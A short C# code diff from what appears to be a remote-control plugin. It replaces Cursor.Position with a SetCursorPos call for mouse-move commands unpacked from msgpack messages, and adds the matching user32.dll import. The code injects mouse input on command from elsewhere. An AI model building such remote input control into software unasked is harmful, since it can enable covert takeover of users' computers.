@@ -38,16 +38,13 @@ namespace Plugin
 
                             case "mouseClick":
                                 {
-                                    //Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
-                                   // Cursor.Position = position;
                                     mouse_event((Int32)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
                                     break;
                                 }
 
                             case "mouseMove":
                                 {
-                                    Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
-                                    Cursor.Position = position;
+                                    SetCursorPos(Convert.ToInt32(unpack_msgpack.ForcePathObject("X").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Y").AsInteger));
                                     break;
                                 }
 
@@ -171,6 +168,9 @@ namespace Plugin
 
         [DllImport("user32.dll")]
         static extern bool GetCursorInfo(out CURSORINFO pci);
+
+        [DllImport("user32.dll")]
+        internal static extern bool SetCursorPos(int x, int y);
 
         [DllImport("user32.dll")]
         static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
